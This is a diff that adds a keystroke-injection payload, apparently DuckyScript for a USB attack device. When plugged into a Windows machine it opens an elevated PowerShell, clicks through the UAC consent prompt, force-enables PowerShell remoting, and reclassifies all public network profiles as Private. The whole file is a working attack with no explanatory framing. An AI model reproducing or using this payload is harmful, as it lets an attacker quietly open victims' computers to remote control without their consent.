@@ -1,0 +1,28 @@
+DELAY 500
+WINDOWS d
+DELAY 500
+WINDOWS r
+DELAY 500
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 800
+LEFTARROW
+ENTER
+DELAY 800
+ALT y
+DELAY 500
+STRING enable-psremoting -force
+ENTER
+STRING Get-NetConnectionProfile |
+ENTER
+STRING Where{ $_.NetWorkCategory -ne 'Private'} |
+ENTER
+STRING ForEach {
+ENTER
+STRING $_
+ENTER
+STRING $_|Set-NetConnectionProfile -NetWorkCategory Private -Confirm
+ENTER
+STRING } 
+ENTER
+STRING exit
